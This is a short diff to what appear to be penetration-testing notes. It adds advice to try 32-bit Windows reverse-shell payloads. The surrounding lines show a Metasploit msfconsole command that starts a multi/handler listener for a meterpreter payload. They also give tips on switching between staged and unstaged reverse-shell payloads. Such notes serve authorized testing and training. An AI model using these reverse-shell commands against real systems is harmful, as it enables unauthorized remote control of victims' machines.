@@ -14,6 +14,8 @@ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterp
 ```
 Also, keep in mind that it's worth attempting staged payloads if the unstaged one doesn't work (and vise versa).
 e.g. when `windows/x64/shell_reverse_tcp` doesn't work, it's worth it to give  `windows/x64/shell/reverse_tcp` a try.
+And also give the 32-bit version a try.
+I have seen examples of the 64-bit version just not working for some reason.
 
 ## encoding
 
